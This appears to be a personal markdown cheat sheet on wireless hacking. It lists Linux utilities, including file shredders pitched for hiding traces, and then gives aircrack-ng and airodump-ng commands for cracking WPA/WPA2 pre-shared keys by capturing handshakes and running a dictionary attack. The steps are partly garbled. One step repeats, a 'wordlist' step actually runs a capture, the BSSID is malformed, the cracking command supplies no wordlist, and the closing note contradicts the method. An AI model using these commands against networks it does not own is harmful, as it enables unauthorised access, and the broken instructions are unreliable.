# Wireless hacking

## General

### Software

#### Linux

- Preload (`sudo apt-get install preload`) - identifies a user's most commonly used programs and preloads binaries and dependencies into memory to provide faster access (it works automatically after the first restart);

- Bleachbit (`sudo apt-get install bleachbit`) - frees disk space, frees cache, delete cookies, clear internet history, shred temporary files, delete logs, and discarding other unnecessary files (can shred files to 
prevent recovery and wiping free disk space to hide traces of files that have not been fully deleted);

- Bum (`sudo apt-get install bum`) - boot up manager, used to disable unnecessary services and applications that are enabled during the boot up;

- apt-file (`apt-get install apt-file`) - searches within packages of the “apt” packaging system, lists contents of a package without installing or fetching it;

- Scrub (`sudo apt-get install scrub`) - secure deletion program to compile with government standards;

- Shutter (`apt-get install shutter`) - screenshot tool that captures images of desktop;

- Figlet (`apt-get install figlet`) - make console look professional by displaying a custom message such as your company name for example

## Attacks

### WPA/WPA2 Dictionary Attack

- find out the BSSID of the access point;

- decide on the wordlist that should be used for the attack;

- capture a legitimate user connecting to the access point;

- generate the authentication traffic;

- capture a legitimate user connecting to the access point;

- execute the dictionary attack;

#### Steps (Aircrack)

- find virtualized Kali Linux LAN adapter that were successfully bridged to current device using `iwconfig`;

- turn off LAN adapter using `sudo ifconfig wlan0 down`;

- put LAN adapter into 'monitor mode' using `sudo iwconfig wlan0 mode monitor`;

- turn on LAN adapter using `sudo ifconfig wlan0 up`;

- confirm that LAN adapter is in 'monitor mode' using `iwconfig`;

- find the BSSID and chanel of the access point using `sudo airodump-ng wlan0` (Aircrack);

- find a wordlist that you can be usde in order to break in to the access point using `sudo airodump-ng --bssid 00:11:22:33:44:55:66 --channel 1 --write wepcracking wlan0`;

- crack the password using following command: `sudo aircrack-ng wepcracking-01.cap` (`wepcracking-01.cap` - file which were generated by previous command);

#### Notes

WPA/WPA2 supports many types of authentication beyond pre-shared keys. Aircrack-ng can ONLY crack pre-shared keys. So make sure airodump-ng shows the network as having the authentication type of PSK, 
otherwise, don't bother trying to crack it. Only plain brute force techniques can be used against WPA/WPA2.
